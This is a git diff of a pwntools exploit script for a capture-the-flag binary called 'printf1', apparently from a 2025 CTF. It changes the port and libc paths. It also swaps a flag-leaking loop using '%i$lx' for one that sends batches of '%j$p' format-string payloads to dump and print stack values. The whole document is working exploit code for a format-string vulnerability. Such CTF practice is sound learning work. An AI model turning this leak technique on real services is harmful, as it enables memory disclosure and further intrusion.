@@ -1,9 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # This exploit template was generated via:
-# $ pwn template --host localhost --port 4001 --libc ../../libc.so.6 ../src/printf1
+# $ pwn template --port 14001 --host localhost --libc ./libc.so.6 ../src/printf1
 from pwn import *
-import binascii
 
 # Set up pwntools for the correct architecture
 exe = context.binary = ELF(args.EXE or '../src/printf1')
@@ -14,7 +13,7 @@ exe = context.binary = ELF(args.EXE or '../src/printf1')
 # ./exploit.py DEBUG NOASLR
 # ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
 host = args.HOST or 'localhost'
-port = int(args.PORT or 4001)
+port = int(args.PORT or 14001)
 
 # Use the specified remote libc version unless explicitly told to use the
 # local system version with the `LOCAL_LIBC` argument.
@@ -22,14 +21,14 @@ port = int(args.PORT or 4001)
 if args.LOCAL_LIBC:
     libc = exe.libc
 elif args.LOCAL:
-    library_path = libcdb.download_libraries('../../libc.so.6')
+    library_path = libcdb.download_libraries('./libc.so.6')
     if library_path:
         exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
         libc = exe.libc
     else:
-        libc = ELF('../../libc.so.6')
+        libc = ELF('./libc.so.6')
 else:
-    libc = ELF('../../libc.so.6')
+    libc = ELF('./libc.so.6')
 
 def start_local(argv=[], *a, **kw):
     '''Execute the target binary locally'''
@@ -68,21 +67,28 @@ continue
 # Stack:      Canary found
 # NX:         NX enabled
 # PIE:        PIE enabled
+# RUNPATH:    b'/home/ena/coding/remote/ctfs/magpiesctf/2025/pwn/printf1/src/../../'
 # Stripped:   No
 # Debuginfo:  Yes
 
-io = start()
-
-# leaking the flag
-flag_parts = []
-for i in range(6, 9):
+parts = []
+for i in range(1, 10):
+    io = start()
+    
+    # the return address of main is the 7th stack var
+    
     io.recvuntil(b"something: ")
-    io.sendline(f"%{i}$lx".encode('ascii'))
-    io.recvuntil(b"You said: ")
-    data = io.recvuntil(b"\nDoesn't", drop=True).decode('ascii')
-    io.recvuntil(b"interesting.")
-    flag_parts.append(data)
+    
+    payload = "|".join([f"%{j}$p" for j in range(i * 10, (i * 10) + 10)])
+    io.sendline(payload.encode('ascii'))
+    
+    io.recvuntil(b"said:")
+    part = io.recvuntil(b"I bet", drop=True).decode('ascii')
+    io.close()
 
-# reassemble the flag
-flag = "".join(map(lambda x: bytes.fromhex(x).decode('utf-8')[::-1], flag_parts))
-io.success(f"Flag is: {flag}.")
+    for p in part.split("|"):
+        parts.append(p)
+
+for index, part in enumerate(parts):
+    print(f"{index}: {part}")
+
